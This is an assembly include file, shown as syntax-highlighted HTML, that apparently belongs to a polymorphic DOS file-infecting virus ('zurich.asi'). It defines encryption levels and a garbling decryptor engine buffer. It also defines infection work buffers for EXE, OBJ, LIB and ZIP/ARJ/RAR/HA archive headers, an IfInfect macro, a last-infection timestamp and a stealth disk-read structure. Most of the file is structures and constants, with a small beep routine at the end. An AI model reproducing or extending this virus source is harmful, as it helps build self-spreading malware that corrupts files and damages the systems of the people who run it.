</span><span class="sc5">EXECRYPTLEVEL</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">23h</span><span class="sc0"> </span><span class="sc1">;+DOUBLEENCRYPT</span><span class="sc0">
</span><span class="sc5">IXECRYPTLEVEL</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">29h</span><span class="sc0">
</span><span class="sc5">ARXCRYPTLEVEL</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">27h</span><span class="sc4">+</span><span class="sc5">DOUBLEENCRYPT</span><span class="sc0">
</span><span class="sc5">OBJCRYPTLEVEL</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">
</span><span class="sc9">IRP</span><span class="sc0"> </span><span class="sc5">EXT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">ARX</span><span class="sc4">,</span><span class="sc5">EXE</span><span class="sc4">,</span><span class="sc5">IXE</span><span class="sc4">,</span><span class="sc5">OBJ</span><span class="sc4">,</span><span class="sc5">HDR</span><span class="sc4">&gt;</span><span class="sc0">
    </span><span class="sc5">zmefl</span><span class="sc4">&amp;</span><span class="sc5">EXT</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(&amp;</span><span class="sc5">EXT</span><span class="sc4">&amp;</span><span class="sc5">CRYPTLEVEL</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">ENFLAGS_</span><span class="sc4">&amp;</span><span class="sc5">EXT</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc5">UNINIT</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1111h</span><span class="sc0">
</span><span class="sc5">ZIP_SIGN</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">4B50h</span><span class="sc0">
</span><span class="sc5">ARJ_SIGN</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">60000d</span><span class="sc0">
</span><span class="sc5">RAR_SIGN</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">6152h</span><span class="sc0">
</span><span class="sc5">HA_METHOD_STORED</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">20H</span><span class="sc0">
</span><span class="sc5">ARJ_METHOD_STORED</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ZIP_METHOD_STORED</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RAR_METHOD_STORED</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">
</span><span class="sc5">ZIP_LCL_ID</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">403h</span><span class="sc0">
</span><span class="sc5">ZIP_CNL_ID</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">201h</span><span class="sc0">
</span><span class="sc5">ZIP_END_ID</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">605h</span><span class="sc0">
</span><span class="sc5">CRLF</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;dword_shit struc</span><span class="sc0">
</span><span class="sc1">;       lo   dw ?</span><span class="sc0">
</span><span class="sc1">;       hi   dw ?</span><span class="sc0">
</span><span class="sc1">;ends</span><span class="sc0">
</span><span class="sc5">dword_shit</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
    </span><span class="sc9">union</span><span class="sc0">
        </span><span class="sc5">lo</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc9">struc</span><span class="sc0">
            </span><span class="sc5">l</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">h</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc9">ends</span><span class="sc0">
    </span><span class="sc9">ends</span><span class="sc0">
    </span><span class="sc5">hi</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">ifInfJump</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">whatest</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">execut</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">IfInfect</span><span class="sc4">&amp;</span><span class="sc5">whatest</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc1">;    lea     di, execut</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IfInfect</span><span class="sc4">&amp;</span><span class="sc5">whatest</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">probability_test</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">variabl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">glb_pr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">go_to</span><span class="sc0">
</span><span class="sc9">local</span><span class="sc0"> </span><span class="sc5">__1</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">variabl</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">variabl</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">__1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">glb_pr</span><span class="sc0">
</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">go_to</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc5">prALWAYS</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">ENGBUFFER</span><span class="sc0">   </span><span class="sc9">STRUC</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc9">UNION</span><span class="sc0">
                </span><span class="sc9">STRUC</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
                    </span><span class="sc5">zmeflags</span><span class="sc0">        </span><span class="sc5">ENFLAGS</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
                    </span><span class="sc5">cur_cryptlevel</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc9">ENDS</span><span class="sc0">
                </span><span class="sc5">zmefl</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc9">ENDS</span><span class="sc0">
            </span><span class="sc5">datasize</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">jmp_after_decrypt</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">targetptr</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">segm_IDT</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">cJMP_patch</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">nJMP_patch</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">begin_sub</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">end_of_jmp</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">start_reg2</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">start_reg3</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">loop_top</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">lastgarble</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">lastchoose</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">decryptor_size</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">relocator_base</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">reloff_1</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">reloff_2</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">value_J</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">value_X</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">value_Y</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">useregs</span><span class="sc0">                 </span><span class="sc5">asgrbl</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc9">IRPC</span><span class="sc0"> </span><span class="sc5">NR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0123456</span><span class="sc0">
                </span><span class="sc5">reg</span><span class="sc4">&amp;</span><span class="sc5">NR</span><span class="sc0">              </span><span class="sc5">RegWord</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc1">;all_memory_size_p=400h ;16k in memory :)</span><span class="sc0">
</span><span class="sc5">all_memory_size_p</span><span class="sc4">=</span><span class="sc2">700h</span><span class="sc0"> </span><span class="sc1">;20k in memory :(</span><span class="sc0">
</span><span class="sc5">HDRBUFSIZE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">22h</span><span class="sc0">
</span><span class="sc5">hp</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">80h</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc5">WORKBUFFER</span><span class="sc0">  </span><span class="sc9">STRUC</span><span class="sc0">
        </span><span class="sc9">UNION</span><span class="sc0">
            </span><span class="sc9">STRUC</span><span class="sc0"> </span><span class="sc1">;infect ARX</span><span class="sc0">
                </span><span class="sc5">_arx_crc</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc5">_fnamestr</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">12d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc5">_hafcount</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc9">ENDS</span><span class="sc0">
            </span><span class="sc9">STRUC</span><span class="sc0"> </span><span class="sc1">;infect OMF</span><span class="sc0">
                </span><span class="sc5">_siz98</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc5">_posA0</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc5">_sizA0</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc5">_lib_dict_offset</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc9">ENDS</span><span class="sc0">
            </span><span class="sc9">STRUC</span><span class="sc0">
                </span><span class="sc9">UNION</span><span class="sc0">
                    </span><span class="sc9">STRUC</span><span class="sc0"> </span><span class="sc1">;func 4B</span><span class="sc0">
                        </span><span class="sc5">_load_fname</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc5">_load_array</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
                    </span><span class="sc9">ENDS</span><span class="sc0">
                    </span><span class="sc9">STRUC</span><span class="sc0"> </span><span class="sc1">;func 3F</span><span class="sc0">
                        </span><span class="sc5">_rd_st_cnt</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc5">_st_rd_off</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc5">_beg_pos_lo</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
                    </span><span class="sc9">ENDS</span><span class="sc0">
                </span><span class="sc9">ENDS</span><span class="sc0">
                </span><span class="sc9">UNION</span><span class="sc0">
                    </span><span class="sc5">_saved_seek</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;for restore header etc</span><span class="sc0">
                    </span><span class="sc9">STRUC</span><span class="sc0"> </span><span class="sc1">;stealth int25</span><span class="sc0">
                        </span><span class="sc5">_start_sec</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc5">_abs_read_drive</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
                    </span><span class="sc9">ENDS</span><span class="sc0">
                </span><span class="sc9">ENDS</span><span class="sc0">
            </span><span class="sc9">ENDS</span><span class="sc0">
         </span><span class="sc9">ENDS</span><span class="sc0">
        </span><span class="sc5">_host_arx_date</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; ¤äâ  § à ¦ ¥¬®£® ä ©« </span><span class="sc0">
        </span><span class="sc5">_host_arx_time</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; ¤äâ  § à ¦ ¥¬®£® ä ©« </span><span class="sc0">
        </span><span class="sc5">_beg_pos</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;use in "f_insert"</span><span class="sc0">
        </span><span class="sc5">_pos98</span><span class="sc0">                      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">_fisize</span><span class="sc0">                     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">_fioff</span><span class="sc0">                      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">_fnamesize</span><span class="sc0">                  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">_crthdr</span><span class="sc0">                     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">_last_infect_time</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">_hook</span><span class="sc0">                       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">_close_on_error</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;if 1, doserror-&gt; close file</span><span class="sc0">
        </span><span class="sc5">_save_sp</span><span class="sc0">                    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">_save_ss</span><span class="sc0">                    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">_after_goto</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">_five_bytes</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">_turn_name_crc</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">_engdata</span><span class="sc0">                    </span><span class="sc5">ENGBUFFER</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">_exehdr</span><span class="sc0">                     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">HDRBUFSIZE</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;        _dataencriptor              dd      CRYPTLEVEL dup (?)</span><span class="sc0">
</span><span class="sc1">;        _for_ret                    db      ?</span><span class="sc0">

</span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc5">_hahdr</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">_exehdr</span><span class="sc0">
</span><span class="sc5">_ziphdr</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">_exehdr</span><span class="sc0">
</span><span class="sc5">_arjhdr</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">_exehdr</span><span class="sc0">
</span><span class="sc5">_rarhdr</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">_exehdr</span><span class="sc0">
</span><span class="sc5">_objhdr</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">_exehdr</span><span class="sc0">
</span><span class="sc5">_libhdr</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">_exehdr</span><span class="sc0">
</span><span class="sc5">_sfxhdr</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">_exehdr</span><span class="sc0">
</span><span class="sc5">_shift_buffer</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">_exehdr</span><span class="sc0">


</span><span class="sc5">To_hp</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0"> </span><span class="sc5">some_label</span><span class="sc0">
    </span><span class="sc5">some_label</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc5">hp</span><span class="sc4">+</span><span class="sc5">_</span><span class="sc4">&amp;</span><span class="sc5">some_label</span><span class="sc4">&amp;)</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">host_arx_date</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">host_arx_time</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">hook</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">last_infect_time</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">close_on_error</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">after_goto</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">lib_dict_offset</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">hafcount</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">saved_seek</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">start_sec</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">abs_read_drive</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">beg_pos</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">arx_crc</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">load_fname</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">load_array</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">rd_st_cnt</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">st_rd_off</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">beg_pos_lo</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">fnamestr</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">pos98</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">siz98</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">posA0</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">sizA0</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">fisize</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">fioff</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">fnamesize</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">engdata</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">crthdr</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">exehdr</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">save_sp</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">save_ss</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">five_bytes</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">turn_name_crc</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">hahdr</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">ziphdr</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">arjhdr</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">rarhdr</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">objhdr</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">libhdr</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">sfxhdr</span><span class="sc0">
</span><span class="sc5">To_hp</span><span class="sc0">   </span><span class="sc5">shift_buffer</span><span class="sc0">

</span><span class="sc9">PURGE</span><span class="sc0"> </span><span class="sc5">To_hp</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">zurich.asi</span><span class="sc0">
</span><span class="sc5">code</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0">
</span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">
</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">USE_BEEP</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0">  </span><span class="sc5">beep</span><span class="sc0">

</span><span class="sc5">beep</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">beep1</span><span class="sc0">
</span><span class="sc5">beep</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">beep1</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
      </span><span class="sc6">out</span><span class="sc0">       </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc9">REPT</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
      </span><span class="sc6">loop</span><span class="sc0">      </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">out</span><span class="sc0">       </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">beep1</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">

</span><span class="sc1">;include shmac.inc</span><span class="sc0">
